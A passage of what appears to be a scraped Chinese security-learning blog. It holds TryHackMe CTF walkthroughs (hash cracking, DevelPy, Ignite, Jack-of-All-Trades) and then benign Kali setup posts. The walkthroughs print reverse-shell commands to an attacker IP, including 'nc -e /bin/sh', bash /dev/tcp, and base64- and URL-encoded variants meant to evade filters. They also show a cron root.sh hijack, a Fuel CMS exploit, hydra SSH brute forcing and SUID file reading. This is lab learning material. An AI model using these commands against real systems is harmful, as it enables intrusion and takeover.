：Eternity22\nLevel 2第一题Hash:F09EDCB1FCEFC6DFB23DC3505A882655FF77375ED8AA2D1C13F640FCCC2D0C85\n解决方案 ：与任务 1-1 类似，但 hashcat 的模式是（-m 1400）\n答案：paule\n\n第二题哈希值：1DFECA0C002AE40B8619ECF94819CC1B\n解决方案：与任务 1-1 类似，但 hashcat 的模式是(-m 1000)\n答案 : n63umy8lkf4i\n第三题Hash:$6$aReallyHardSalt$6WKUTqzq.UQQmrm0p&#x2F;T7MPpMbGNnzXPMAXi4bJMl9be.cfi3&#x2F;qxIf.hsGpS41BqMhSrHVXgMpdjS6xeKZAs02.\n解决方案 ：此哈希无法使用在线工具破解，但可以通过设置 hashcat 的-m 1800 模式来破解。（需要一些时间）。\n答案 ：waka99\n第四题哈希: e5d8870e5bdd26602cab8dbe07a942c8669e56d6:tryhackme\n解决方案 ：由于存在盐（tryhackme），这个哈希也无法使用在线工具破解。这只能通过使用 hashcat 并设置模式 -m 110 来完成。\n答案 : 481616481616\nCrack The Hash Level 2Hash identification第一题hash：741ebf5166b9ece4cca88a3868c44871e8370707cf19af3ceaa4a6fba006f224ae03f39153492853\n解决方案：在hashid里面识别即可也可以在haiti里面识别 最后识别结果为第一条\n\n第二题hash：1aec7a56aa08b25b596057e1ccbcb6d768b770eaa0f355ccbd56aee5040e02ee\n解决方案：丢进haiti识别\n* \n\n这里HC的值为：17800\n\n\n第三题What is Keccak-256 Hashcat code?\n\n从上一题就看出Keccak-256 Hashcat的值为：17800\n\n第四题What is Keccak-256 John the Ripper code?\n\n从第二题看出Keccak-256 John的值为：raw-keccak-256\n\nWordlists\nwordlistctl 是 Kali Linux 提供的一个 管理和安装密码字典（wordlist）工具，专门用来方便用户获取和管理系统自带或在线的常用密码列表。它的作用类似一个“字典管理器”\n\n列出系统已安装的字典\n下载官方维护的字典（如 rockyou.txt）\n安装或更新字典\n配置字典路径供渗透测试工具（如 Hashcat、John the Ripper）使用\n","categories":["TryHackMe"],"tags":["渗透测试","Web安全","网络安全","学习笔记"]},{"title":"DevelPy-TryHackMe","url":"/2025/09/16/DevelPy-TryHackMe/","content":"DevelPy-TryHackMe一、信息收集\n这次没有开放80端口了，这里nmap扫描出来给了一个很奇怪的服务，这看起来像是靶机作者故意写的一个 交互式 Python 脚本服务，挂在 10000 端口，它会要求你输入内容，然后报错（显示 Python 源码片段），用nc连接试试\n\nnmap -sV -sC -O   10.10.216.119\n\n\n二、内网渗透\n我这里使用nc连接然后输入了10 这里就返回来 10次数据包，如果开发者用了危险函数（比如 eval(input()) 或 os.system(input())），那就有可能 输入被当成命令执行。\n\n\n\n这里我们尝试执行命令的 Python 代码,成功看到了用户权限，那么我们这里就直接构建payload反弹shell\n\n__import__(&#x27;os&#x27;).system(&#x27;id&#x27;)\n\n\n\n构造payload发送过去\n\n__import__(&#x27;os&#x27;).system(&#x27;nc -e /bin/sh 10.17.35.134 4444 &#x27;)\n\n\n\n开启新的终端启动监听端口，拿到shell，至此我们拿到第一个flag\n\nnc -lvnp 4444\n\n\n三、提权\n我们看看当前用户有什计划任务执行，root.sh 文件由 root 用户通过 cron 在任何时刻执行。因此，通过修改其内容，我们可以执行一个脚本以连接到 root shell。当完成这一步后，我们就能获得 root 访问权限\n\n\n\n我们删除root.sh文件再将我们反弹shell的命令写入，当任务执行的时候我们就能拿到rootshell\n\necho &quot;bash -i &gt;&amp; /dev/tcp/[Your IP]/5555 0&gt;&amp;1&quot; &gt; root.sh\n\n\n\n这里启动监听端口\n\nnc -l -vv -p 5555\n\n\n成功获得root shell\n","categories":["TryHackMe"],"tags":["渗透测试","Web安全","网络安全","学习笔记"]},{"title":"Ignite – TryHackMe","url":"/2025/09/16/Ignite%20%E2%80%93%20TryHackMe/","content":"Ignite – TryHackMe一、信息收集\n开启房间后给了我们一个ip地址，去访问看看\n\n\n\n我们使用nmap对这个ip的端口进行扫描一下开开有什么开放的端口\n\n\n\n这里只开放了一个80端口，访问这个网站介绍了一下是一个cms系统Fuel CMS 1.4 里面大致介绍了一下这个cms的安装指南，里面还管理员的后台地址http://10.10.149.22/fuel和账户密码\n\n\n\n去后台管理看一下，在页面这里能进行文件上传\n\n\n二、漏洞利用\n现在知道这个cms版本我们使用searchsploit看看是否有这个版本的漏洞\n\n\nsearchsploit 用来在本地搜索 Exploit-DB 漏洞利用库。 它可以帮你快速找到某个软件&#x2F;服务&#x2F;系统对应的已知漏洞和可利用代码（PoC&#x2F;Exploit）。\n\n\n\n先复制出来会在你当前目录生成\n\n\n\n查看源码nano 47138.py\n\n\n\n将里面的ip更新为要攻击的靶机的ip地址，脚本默认要通过 127.0.0.1:8080 代理发送请求（通常是用来抓 BurpSuite 的包），但是你地并没有开 Burp 监听所有这里要注释掉，注意千万不要把整行删掉，只是把 , proxies=proxy 去掉\n\n\n\n执行我们的代码文件python2 47138.py\n\n\n如果报错了显示print r.text[0:dup]        ^SyntaxError: Missing parentheses in call to ‘print’. Did you mean print(…)?用python2运行就好了\n\n\n\n确认目标机器有没有 Bash which bash\n\n\nBash 的作用在 Linux 系统里：\n命令解释器：你输入的命令都要通过 Bash 翻译成操作系统能执行的动作。\n写脚本：可以写 .sh 文件，让一系列命令自动执行。\n交互式 shell：可以让你远程操作系统，就像坐在终端前一样。\n渗透测试常用工具：反弹 shell、执行系统命令、获取权限信息\n\n\n\n\n接下来我们使用反弹shell生成器生成一个反弹命令shell,方便在 Kali 上操作目标机器\n\nsh -i &gt;&amp; /dev/tcp/10.17.35.134/4444 0&gt;&amp;1#10.17.35.134 是 Kali IP → 靶机会回连到 Kali#4444 是你在 Kali 上开的监听端口#bash -i 启动交互式 shell\n\n\nhttps://forum.ywhack.com/reverse-shell/\n\n\n\n在kali上启动监听端口\n\n\n\n这里我在使用这条命令是时候报错了\n\n报错信息：\npreg_match(): Delimiter must not be alphanumeric or backslash\n\n\nPHP 的 preg_match() 正则函数要求 正则模式的分隔符不能是字母或反斜杠。\n你输入的命令被 Fuel CMS 的 过滤或包装成了 preg_match，导致命令中包含某些字符（比如 &gt;、&amp;）后触发了错误。\n本质上，你的命令 sh -i &gt;&amp; /dev/tcp/10.17.35.134/4444 0&gt;&amp;1 被 PHP 当作字符串处理，不能直接执行。\n\n这里采用绕过特殊字符使用 URL 编码或 base64 绕过 PHP 正则过滤\n# 在 Kali 上把命令编码echo &quot;bash -i &gt;&amp; /dev/tcp/10.17.35.134/4444 0&gt;&amp;1&quot; | base64#然后在 Fuel CMS RCE 输入bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xNy4zNS4xMzQvNDQ0NCAwPiYxCg==&#125;|&#123;base64,-d&#125;|bash\n\n\n\n\n\n浏览到“&#x2F;home&#x2F;www-data”目录并获取到“User.txt”文件\n\n\n6470e394cbf6dab6a91682cc8585059b\n\n三、TTY 升级\n我们这里使用sudo-l这里会报错sudo 默认要求 输入用户密码，当你在 反弹 shell 或 Web RCE shell 中执行 sudo 时，shell 没有连接到真实终端（没有 tty），系统无法提示你输入密码，所以 sudo 报错，提示没有 tty 也没有 askpass 程序。\n\n\n\n我们现在要去升级 shell 并获取 tty 的命令，保证后续可以执行 sudo 或交互式命令\n\n两种方法\n方法1：分配伪终端\n在 Kali 上开 nc 时：\nnc -lvnp 4444\n\n在拿到 shell 后，按 Ctrl+Z 暂停，然后在 Kali 终端：\nstty raw -echofg\n\n然后尝试：\nsudo -l\n\n\n有些系统还要求加 -S 或 -A 方式提供密码\n\n方法2：升级 shell 到 fully interactive shell\n\n拿到 python shell：\n\npython -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;\n\n\n然后 Ctrl+Z + stty raw -echo + fg\n再执行 sudo\n\n\n如果目标 www-data 用户 没有 sudo 权限，这条命令仍然会报错，这属于正常情况。\n\n\n我这里使用的第二种方法成功有密码提示了，但是我们没有密码先放着\n\n\n四、提权\n在信息收集的时候看到在**fuel/application/config/database.php**有数据库的用户名和密码，我们直接去这个文件里面看看\n\n\n\n可以看到在这里显示了数据库的密码\n\n\n\n现在获得密码后切换到root看看\n\n\nb9bbcb33e11b80be759c4e844862482d \n\n\n\n扩展反弹 shell 其实是 从目标机器通过网络回连到你的 Kali，中间会经过几层限制。不同阶段的 shell，权限和功能不同：\n\n\n\n阶段\n特点\n典型问题\n\n\n\nStage 1：非交互式 shell（raw shell）\n直接通过 RCE 或反弹命令连回\n- 无法使用上下箭头、tab 补全- Ctrl+C 无效- 回车显示 ^M\n\n\nStage 2：伪交互式 shell\n通过 /bin/sh -i 或 bash -i 升级\n- 可以输入命令，部分交互可用- 还可能缺少 tty，部分工具无法用\n\n\nStage 3：Fully interactive shell (带 TTY)\n使用 Python&#x2F;pty.spawn 或 Ctrl+Z + stty raw\n- 完全像正常登录一样- 支持 sudo、编辑器、top 等交互工具\n\n\n为什么要有“阶段升级”\n\n最开始拿到的 shell通常是非常原始的\nFuel CMS RCE 或 web shell 执行命令时，系统不会自动分配 tty\n只能执行简单命令，例如 whoami、id\n\n\n部分操作必须要交互式终端\n提权（sudo -l）\n上传&#x2F;下载文件\n使用交互式工具（nano, htop）\n\n\n升级 shell的方式\n/bin/bash -i → bash interactive\npython -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39; → fully interactive, 带 tty\nCtrl+Z + stty raw -echo + fg → 在有 tty 时升级\n\n\n\n","categories":["TryHackMe"],"tags":["渗透测试","Web安全","网络安全","学习笔记"]},{"title":"Jack-of-All-Trades","url":"/2025/09/16/Jack-of-All-Trades/","content":"Jack-of-All-Trades一、信息收集\n先使用nmap扫一下Ip看看开放了哪些端口，这里很奇怪，22端口上面却是部署着http协议，看了一下wp这里要使用浏览器绕过这个限制\n\nnmap -sS -A -Pn 10.10.196.165 \n\n\n\n这里使用firefox，在导航栏里面搜索about config然后再出来的搜索框这里再搜索network.security.ports.banned.override在某些 Firefox 版本中，这可能会显示无结果（在这种情况下，在页面上右键单击任何位置，选择 new -&gt; String 并将搜索查询用作首选项名称）——在其他版本中，它将显示与我相同的内容\n\n\n\n选择字符串后，然后添加上22\n\n\n\n接着再刷新页面就能成功访问了\n\n\n\n这里使用dirsearch扫一下这个ip看看有什么文件，这里记得要加22端口\n\npython3 dirsearch.py -u http://10.10.196.165:22 -e php,html,txt -t 50 -x 403,401\n\n\n\n只有一个assets访问一下里面有什么\n\n\n二、渗透利用\n三张图片和一个css文件看看css文件里面有什么\n\n\n\n这个css点开什么都没有，下手点只能是那几个图片了，先放着我忘记站点的源文件有什么了\n\n\n\n回到首页右键源代码，这里给我了一段提示有一个 隐藏功能页面 /recovery.php，并且下面还给了我一段编码后的的文字，看起来是base64编码，\n\nUmVtZW1iZXIgdG8gd2lzaCBKb2hueSBHcmF2ZXMgd2VsbCB3aXRoIGhpcyBjcnlwdG8gam9iaHVudGluZyEgSGlzIGVuY29kaW5nIHN5c3RlbXMgYXJlIGFtYXppbmchIEFsc28gZ290dGEgcmVtZW1iZXIgeW91ciBwYXNzd29yZDogdT9XdEtTcmFxCg==\n\n\n\n\n\n将这段base64编码解密后又给了我一段提示，给了我们一个密码u?WtKSraq现在我们先访问一下给我们的那个隐藏的php目录\n\n\n\n这里告诉我们当前用户名为Jack根据上面那个base64编码给我们的密码尝试这登录一下，发现有点不对劲，因为输入账户密码后页面加载了一下，就没反应了，也不显示账户或者密码 报错，就只是加载了一下。抓包看看\n\n\n\n这里抓包发包后又有一段隐藏的文字看起来又是base64编码解密一下\n\n\n\n这里拿到kali里面解码一下，发现乱码了。说明这里虽然是base64编码，但是解码之后得到的是不纯的文本，而是二进制文件，所以这里要将解码后保存成文件才行\n\n\necho &quot;GQ2TOMRXME3TEN3BGZTDOMRWGUZDANRXG42TMZJWG4ZDANRXG42TOMRSGA3TANRVG4ZDOMJXGI3DCNRXG43DMZJXHE3DMMRQGY3TMMRSGA3DONZVG4ZDEMBWGU3TENZQGYZDMOJXGI3DKNTDGIYDOOJWGI3TINZWGYYTEMBWMU3DKNZSGIYDONJXGY3TCNZRG4ZDMMJSGA3DENRRGIYDMNZXGU3TEMRQG42TMMRXME3TENRTGZSTONBXGIZDCMRQGU3DEMBXHA3DCNRSGZQTEMBXGU3DENTBGIYDOMZWGI3DKNZUG4ZDMNZXGM3DQNZZGIYDMYZWGI3DQMRQGZSTMNJXGIZGGMRQGY3DMMRSGA3TKNZSGY2TOMRSG43DMMRQGZSTEMBXGU3TMNRRGY3TGYJSGA3GMNZWGY3TEZJXHE3GGMTGGMZDINZWHE2GGNBUGMZDINQ=&quot; | base64 -d &gt; decoded.bin\n\n\n查看一下文件类型，发现还是报错，可能这并不是base64编码\n\n\n\n我问了一下ai，ai’提示我说这里可能是base32编码，我尝试着解码一下\n\n\n\n这里给了我一段编码，看起来像16进制\n\n45727a727a6f72652067756e67206775722070657271726167766e79662067622067757220657270626972656c207962747661206e657220757671717261206261206775722075627a72636e7472212056207861626a2075626a20736265747267736879206c6268206e65722c20666220757265722766206e20757661673a206f76672e796c2f3247694c443246\n\n\n使用python脚本对这里解码一下\n\nhex_data = &quot;45727a727a6f72652067756e67206775722070657271726167766e79662067622067757220657270626972656c207962747661206e657220757671717261206261206775722075627a72636e7472212056207861626a2075626a20736265747267736879206c6268206e65722c20666220757265722766206e20757661673a206f76672e796c2f3247694c443246&quot;text = bytes.fromhex(hex_data).decode(&#x27;utf-8&#x27;, errors=&#x27;ignore&#x27;)print(text)\n\n\n解密后的结果看不懂,丢ai问了一下这是ROT13加密的文本\n\nErzzore gung gur perqragvnyf gb gur erpbirel ybtva ner uvqra ba gur ubzrcntq! V xabj ubj sbetrgshy lbh ner, fb uref&#x27;n n uvag: ovg.yl/2GiLD2F\n\n\n再使用脚本对ROT13解码\n\nimport codecsrot13_text = codecs.decode(text, &#x27;rot_13&#x27;)print(rot13_text)\n\n\n解码后给了我们一个提示\n记住，恢复登录的凭证隐藏在主页上！ 我知道你有多直接，所以这里有个提示：bit.ly&#x2F;2TiYQ2S\n\n\n\nRemember that the credentials to the recovery login are hidden on the homepage!I know how forwardly you are, so here&#x27;s a hint: bit.ly/2TiYQ2S\n\n\n短链接直接访问失效了，还是得从主页下手，f12开发者工具栏，在head标签第一个style样式里面发现了编码\n\n\nbackground-image: url(&quot;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADgAAAA4CAMAAACfWMssAAAAtFBMVEUAAAD////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////oK74hAAAAPHRSTlMABBMIDyQXHwyBfFdDMSw+OjXCb+5RG51IvV/k0rOqlGRM6KKMhdvNyZBz9MaupmxpWyj437iYd/yJVNZeuUC7AAACt0lEQVRIx53T2XKiUBCA4QYOiyCbiAsuuGBcYtxiYtT3f6/pbqoYHVFO5r+iivpo6DpAWYpqeoFfr9f90DsYAuRSWkFnPO50OgR9PwiCUFcl2GEcx+N/YBh6pvKaefHlUgZd1zVe0NbYcQjGBfzrPE8Xz8aF+71D8gG6DHFPpc4a7xFiCDuhaWgKgGIJQ3d5IMGDrpS4S5KgpIm+en9f6PlAhKby4JwEIxlYJV9h5k5nee9GoxHJ2IDSNB0dwdad1NAxDJ/uXDHYmebdk4PdbkS58CIVHdYSUHTYYRWOJblWSyu2lmy3KNFVJNBhxcuGW4YBVCbYGRZwIooipHsNqjM4FbgOQqQqSKQQU9V8xmi1QlgHqQQ6DDBvRUVCDirs+EzGDGOQTCATgtYTnbCVLgsVgRE0T1QE0qHCFAht2z6dLvJQs3Lo2FQoDxWNUiBhaP4eRgwNkI+dAjVOA/kUrIDwf3CG8NfNOE0eiFotSuo+rBiq8tD9oY4Qzc6YJw99hl1wzpQvD7ef2M8QgnOGJfJw+EltQc+oX2yn907QB22WZcvlUpd143dqQu+8pCJZuGE4xCuPXJqqcs5sNpsI93Rmzym1k4Npk+oD1SH3/a3LOK/JpUBpWfqNySxWzCfNCUITuDG5dtuphrUJ1myeIE9bIsPiKrfqTai5WZxbhtNphYx6GEIHihyGFTI69lje/rxajdh0s0msZ0zYxyPLhYCb1CyHm9Qsd2H37Y3lugVwL9kNh8Ot8cha6fUNQ8nuXi5z9/ExsAO4zQrb/ev1yrCB7lGyQzgYDGuxq1toDN/JGvN+HyWNHKB7zEoK+PX11e12G431erGYzwmytAWU56fkMHY5JJnDRR2eZji3AwtIcrEV8Cojat/BdQ7XOwGV1e1hDjGGjXbdArm8uJZtCH5MbcctVX8A1WpqumJHwckAAAAASUVORK5CYII=&quot;);\n\n\ndata:image/png;base64,... 表示这是一张 PNG 图片的 Base64 编码把这个 Base64 解码成 PNG 图片文件，然后查看图片内容,注意把 iVBOR... 后面的完整 Base64 数据都保存进去\n\necho &quot;iVBORw0KGgoAAAANSUhEUgAAADgAAAA4CAMAAACfWMssAAAAtFBMVEUAAAD////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////oK74hAAAAPHRSTlMABBMIDyQXHwyBfFdDMSw+OjXCb+5RG51IvV/k0rOqlGRM6KKMhdvNyZBz9MaupmxpWyj437iYd/yJVNZeuUC7AAACt0lEQVRIx53T2XKiUBCA4QYOiyCbiAsuuGBcYtxiYtT3f6/pbqoYHVFO5r+iivpo6DpAWYpqeoFfr9f90DsYAuRSWkFnPO50OgR9PwiCUFcl2GEcx+N/YBh6pvKaefHlUgZd1zVe0NbYcQjGBfzrPE8Xz8aF+71D8gG6DHFPpc4a7xFiCDuhaWgKgGIJQ3d5IMGDrpS4S5KgpIm+en9f6PlAhKby4JwEIxlYJV9h5k5nee9GoxHJ2IDSNB0dwdad1NAxDJ/uXDHYmebdk4PdbkS58CIVHdYSUHTYYRWOJblWSyu2lmy3KNFVJNBhxcuGW4YBVCbYGRZwIooipHsNqjM4FbgOQqQqSKQQU9V8xmi1QlgHqQQ6DDBvRUVCDirs+EzGDGOQTCATgtYTnbCVLgsVgRE0T1QE0qHCFAht2z6dLvJQs3Lo2FQoDxWNUiBhaP4eRgwNkI+dAjVOA/kUrIDwf3CG8NfNOE0eiFotSuo+rBiq8tD9oY4Qzc6YJw99hl1wzpQvD7ef2M8QgnOGJfJw+EltQc+oX2yn907QB22WZcvlUpd143dqQu+8pCJZuGE4xCuPXJqqcs5sNpsI93Rmzym1k4Npk+oD1SH3/a3LOK/JpUBpWfqNySxWzCfNCUITuDG5dtuphrUJ1myeIE9bIsPiKrfqTai5WZxbhtNphYx6GEIHihyGFTI69lje/rxajdh0s0msZ0zYxyPLhYCb1CyHm9Qsd2H37Y3lugVwL9kNh8Ot8cha6fUNQ8nuXi5z9/ExsAO4zQrb/ev1yrCB7lGyQzgYDGuxq1toDN/JGvN+HyWNHKB7zEoK+PX11e12G431erGYzwmytAWU56fkMHY5JJnDRR2eZji3AwtIcrEV8Cojat/BdQ7XOwGV1e1hDjGGjXbdArm8uJZtCH5MbcctVX8A1WpqumJHwckAAAAASUVORK5CYII=&quot; &gt; img.b64\n\n\n解码PNG图片\n\nbase64 -d img.b64 &gt; img.png\n\n\n查看图片\n\nxdg-open img.png\n\n\n还是报错这里看了一下wp原本那个短链接是能访问的我这里访问报错，访问短链接后会给一个对剑齿龙的维基百科，这里赫然醒目这Stegosauria这几个字，配合这前的assets目录下载看看有什么东西\n\n\n\n把文件全下载到本地\n\n\n\n使用命令查看 这里提示我们要使用密码，我们使用jack的密码u?WtKSraq,对其中两个文件分别查看，告诉我们了一个creds.txt和cms.creds 这里查看creds.txt告诉我们文件错了但是方向是对的，那么我们查看cms.creds看看\n\n\n\n好耶，给了我们一个账户和密码登录看看\n\nUsername: jackintheboxPassword: TplFxiSHjY\n\n\n\n这里已经很明显提示我们了，这里有RCE命令执行\n\n\n三、内网渗透\n看看当前用户，写一个反弹的shell进去，在kali启动监听端口，拿到shell\n\nbash -c &#x27;bash -i &gt;&amp; /dev/tcp/10.17.35.134/4444 0&gt;&amp;1&#x27;URL编码：bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.17.35.134%2F4444%200%3E%261%27\n\n\n\n在翻阅目录的过程中发现了在home目录下面有关于jack的密码\n\n\n\n将jack的密码保存在本地上面，使用九头蛇对ssh服务进爆破,拿到jack的密码ITMJpGGIqg1jn?&gt;@\n\nhydra -l jack -P &lt;path-to-copied-passwords&gt; -s 80 ssh://&lt;remote-ip&gt;\n\n\n\n现在使用ssh进行连接,这下面有个图片\n\nssh -p 80 jack@10.10.120.43 \n\n\n\n查看一下靶机上面是否有安装nc\n\nnc -h\n\n\n\n使用nc将图片传输到我们的kali上面使用默认查看器查看图片,也是看到了我们想要的东西\n\n靶机: nc IP 4444 &lt; user.jpgKALI:nc -lvnp 4444 &gt; user.jpgxdg-open user.jpg\n\n\n四、提权\n这里我想查看能以root身份启动的命令和计划任务都没有可以利用的地方，那么看看SUID文件\n\n\n\n最值得马上试的是 /usr/bin/strings（setuid root） —— 这是不常见且很有价值的“直接读 root 只读文件”的途径。你可以用它读取 /etc/shadow 等通常只有 root 能读的文件，我们可以利用这个直接拿到我们想要的东西\n\nfind / -perm -4000 -type f 2&gt;/dev/null\n\n\n\n直接使用string读取位于根目录下面的root.txt\n\n/usr/bin/strings /root/root.txt\n\n\n","categories":["TryHackMe"],"tags":["渗透测试","Web安全","网络安全","学习笔记"]},{"title":"Kali Linux 系统在执行 sudo apt-get update 时出现了 GPG 公钥缺失错误","url":"/2025/09/16/Kali%20Linux%20%E7%B3%BB%E7%BB%9F%E5%9C%A8%E6%89%A7%E8%A1%8C%20sudo%20apt-get%20update%20%E6%97%B6%E5%87%BA%E7%8E%B0%E4%BA%86%20GPG%20%E5%85%AC%E9%92%A5%E7%BC%BA%E5%A4%B1%E9%94%99%E8%AF%AF/","content":"Kali Linux 系统在执行 sudo apt-get update 时出现了 GPG 公钥缺失错误起因是早上在配置kail的代理查看kali的7891端口是否开放的时候需要安装ufw，但是报错404 Not Found，表明系统无法从 [http://http.kali.org ](http://http.kali.org ) 下载 ufw_0.36.2-8_all.de b 文件\n我这里首先更换了源文件\n# 1：编辑源列表文件sudo vim /etc/apt/sources.list# 2：替换为可靠的镜像源（如阿里云）deb http://mirrors.aliyun.com/kali kali-rolling main non-free contribdeb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib# 3.刷新软件源信息sudo apt-get update\n\n先进行了执行以下命令刷新软件源信息sudo apt-get update又报错\n\n这里告诉我的GPG 密钥缺失，密钥环未同步\n\nGPG 密钥缺失系统缺少验证软件仓库签名的公钥 ED65462EC8D5E4C5（Kali Linux 官方仓库的加密签名密钥）。\n\n\n当镜像站（如 mirror.nyist.edu.cn）同步官方仓库时，其软件包需用此密钥签名验证。\n若本地未安装该密钥，APT 会拒绝更新，防止安装被篡改的软件包（安全机制）。\n\n\n密钥环未同步Kali 使用独立的密钥包 kali-archive-keyring 管理公钥。以下情况会导致缺失：\n\n\n新安装系统未包含此包\n国内镜像站未同步最新密钥文件\n密钥已过期（Kali 密钥通常每 1-2 年轮换）\n\n\n\n完整解决方案（分三步）第一步：手动添加缺失的 GPG 密钥（推荐方法）# 从 Ubuntu 密钥服务器获取公钥（ED65462EC8D5E4C5）sudo gpg --keyserver hkps://keyserver.ubuntu.com --recv-keys ED65462EC8D5E4C5# 将密钥转换为 APT 可识别的格式sudo gpg --export --armor ED65462EC8D5E4C5 | sudo tee /etc/apt/trusted.gpg.d/kali-key.asc &gt; /dev/null\n\n\n原理：直接通过 GPG 协议获取密钥，避免依赖问题。注意：若 gpg 命令无效，先安装 gnupg：sudo apt install gnupg\n\n第二步：安装 Kali 官方密钥环（备用方法）若第一步无效，直接安装密钥管理包：\n# 下载最新密钥环（2025年适用版本）wget https://http.kali.org/kali/pool/main/k/kali-archive-keyring/kali-archive-keyring_2025.1_all.deb# 安装密钥环sudo dpkg -i kali-archive-keyring_2025.1_all.deb\n\n\n说明：此包包含所有官方仓库的签名密钥。若链接失效，访问 Kali 密钥环目录 获取最新版本。\n\n第三步：验证修复并更新# 重新更新软件源sudo apt-get update# 检查是否仍有错误sudo apt-get upgrade -y\n\n\n预期结果：GPG 错误消失，可正常下载软件包列表。\n\n当我再使用sudo apt-get update的时候就可以啦\n\n\n\n\n问题层级\n原因描述\n解决方案\n\n\n\n安全机制\nAPT 要求验证软件包签名\n必须安装对应 GPG 公钥\n\n\n密钥管理\nkali-archive-keyring 包缺失或过期\n手动添加密钥或安装密钥环\n\n\n镜像同步\n国内镜像未包含密钥文件\n改用阿里云等可靠镜像源\n\n\n\n始终从官方渠道获取密钥（如 keyserver.ubuntu.com）\n勿使用已弃用的 apt-key add 命令（可能被后续系统移除）\n定期运行 sudo apt update 可提前发现密钥过期问题\n\n","categories":["疑难杂症"],"tags":["故障排查","已解决","问题与复盘","学习问题"]},{"title":"Kali 字体大小设置","url":"/2025/09/16/Kali%20%E5%AD%97%E4%BD%93%E5%A4%A7%E5%B0%8F%E8%AE%BE%E7%BD%AE/","content":"Kali 字体大小设置终端字体颜色调整调整前\n\n调整后\n\n\n在session -&gt; 参数配置\n\n终端颜色这里可以改自己喜欢的终端颜色\n\n在字体这里可以修改字体大小和字体\n\n可以选择图片改终端的背景\n\n\n\n\n\n显示和分辨率在左上角这里选择全部应用程序 选择显示可以修改kali的分辨率和刷新率\n\n桌面图标样式和终端外观依旧是点击左上角选择外观\n\n在第一个样式里面选择能终端的外观\n\n修改前\n \n修改后\n\n\n在图标这里修改能桌面图标的样式\n\n修改前\n\n修改后\n\n默认字体修改前\n\n修改后\n\n在 Kali（或其他 Linux 桌面环境）里，「默认等宽字体」这个选项主要用来指定 系统中需要等宽字体的场景所使用的字体。常见应用：\n\n终端（Terminal）：几乎所有终端都需要等宽字体，方便对齐。\n代码编辑器&#x2F;IDE：写代码时，缩进和对齐要求严格，必须用等宽字体。\n一些日志查看器或系统工具：需要对齐输出的列，依赖等宽字体才能看清楚结构\n\n桌面字体大小调整背景设置鼠标点击桌面右键选择桌面设置\n\n在背景这里可以选择自己喜欢的图片\n\n\n\n在桌面图标这里可以设置图标大小和字体大小已经颜色\n\n\n菜单栏大小鼠标放到菜单栏这里右键选择面板 面板首选项这里\n\n这里可以调整面板的模式 大小和行数\n\n在外观这可以修改面板的背景 不透明度\n\n在项目这里可以修改面板里面的固定标签\n\n\n调整前\n\n调整后\n\n窗口终端标题字体依旧是左上角 这里选择窗口管理器 \n\n微调里面不能修改字体大小和样式\n\n这里可以修改能的主题和窗口终端标题的字体\n修改前\n\n修改后\n\n终端上方字体大小修改\n在图标左上角搜索qt6\n\n\n\n在字体这里进行修改\n\n\n修改前\n\n修改后\n\n","categories":["疑难杂症"],"tags":["故障排查","已解决","问题与复盘","学习问题"]},{"title":"Kali的KDE桌面环境启用从主机向虚拟机跨系统复制粘贴拖动文件教程","url":"/2025/09/16/Kali%E7%9A%84KDE%E6%A1%8C%E9%9D%A2%E7%8E%AF%E5%A2%83%E5%90%AF%E7%94%A8%E4%BB%8E%E4%B8%BB%E6%9C%BA%E5%90%91%E8%99%9A%E6%8B%9F%E6%9C%BA%E8%B7%A8%E7%B3%BB%E7%BB%9F%E5%A4%8D%E5%88%B6%E7%B2%98%E8%B4%B4%E6%8B%96%E5%8A%A8%E6%96%87%E4%BB%B6%E6%95%99%E7%A8%8B/","content":"Kali的KDE桌面环境启用从主机向虚拟机跨系统复制粘贴拖动文件教程​\t启因是自己下载了一个魔改版的kali但是但是在kali里面复制还是无法在从主机向虚拟机跨系统复制粘贴拖动文件，于是我在网上搜索了很多教程\n​\t我刚开始使用的是kali2024.4的一个魔改版，无法跨系统自由复制粘贴，于是我首先想到了安装VMware tools 我从网络上下载了安装包再经过一系列操作之后不行，发现还不能实现拖动复制粘贴功能\n​\t后面去了解了一下在 Kali（Debian&#x2F;Ubuntu 系）里，一般需要两个包：\n\nopen-vm-tools （基础服务）\nopen-vm-tools-desktop（桌面集成功能，比如复制粘贴、拖拽文件、分辨率自适应）\n\ndpkg -l | grep open-vm-tools #检查是否安装\n\n命令输入后这里显示我的已经安装了 open-vm-tools 和 open-vm-tools-desktop，但是报错显示could not be found\n在systemctl list-unit-files 里能看到 vmtoolsd.service，说明服务文件存在，但是状态显示 disabled（未启用）。\nai问了一下大概率是因为 名字没对上 或 没启用。\nsudo systemctl start vmtoolsd \t\t\t#启动服务systemctl status vmtoolsd\t\t\t\t#然后检查状态sudo systemctl enable vmtoolsd\t\t\t#设置开机自启\n\n后面发现还是无法粘贴，我就去ai问了一下和open-vm-tools.service 和 vmtoolsd 的关系\n\nopen-vm-tools.service（如果系统里存在的话）本质上就是 启动 vmtoolsd 的 systemd 单元。\n也就是说：启动 open-vm-tools.service 就会自动运行 vmtoolsd 守护进程。\n\n于是我开始换了一种方法，安装open-vm-tools和open-vm-tools-desktop这里我并不知道新版 Kali KDE 把桌面功能整合在 open-vm-tools 包里，不需要 open-vm-tools-desktop然后我就使用命令\nsudo systemctl enable open-vm-tools-desktopFailed to enable unit: Unit open-vm-tools-desktop.service does not exist sudo systemctl start open-vm-tools-desktopopen-vm-tools-desktop.service: Unit open-vm-tools-desktop.service not found.Failed tostart\n\n显示报错，这里我百思不得其解，于是乎我又开始瞎倒腾弄了一下午才发现新版 Kali KDE 把桌面功能整合在 open-vm-tools 包里，不需要 open-vm-tools-desktop。ai问了一下解决方法\nVMware 工具（VMware Tools）未安装或未启动\n\n剪贴板共享、拖拽文件等功能依赖 VMware Tools。\n如果没有安装或版本不匹配，就无法复制粘贴\n\n# 1. 更新软件源sudo apt update &amp;&amp; sudo apt upgrade -y# 2. 安装 open-vm-tools（包含桌面集成功能）sudo apt install -y open-vm-tools# 3. 启用并启动服务sudo systemctl enable --now open-vm-tools# 4. 别忘记检查是否启动成功systemctl status open-vm-tools# 5. 